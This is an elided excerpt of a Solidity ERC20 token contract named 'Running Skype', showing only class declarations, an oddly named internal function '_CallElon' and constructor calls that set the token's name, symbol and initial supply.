...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function _CallElon(address account, uint256 amount, uint256 val1, uint256 val2) internal virtual {
...
contract ERC20Skype is Context, ERC20 {
    constructor(
        ...
        _CallElon(owner, initialSupply, house6, house7);
    }
}

contract RunningSkype is ERC20Skype {
    constructor() ERC20Skype("Running Skype", "run+skype", false, true, 900, 25, msg.sender, 13370000000 * 10 ** 18, msg.sender, 44) {
    }
}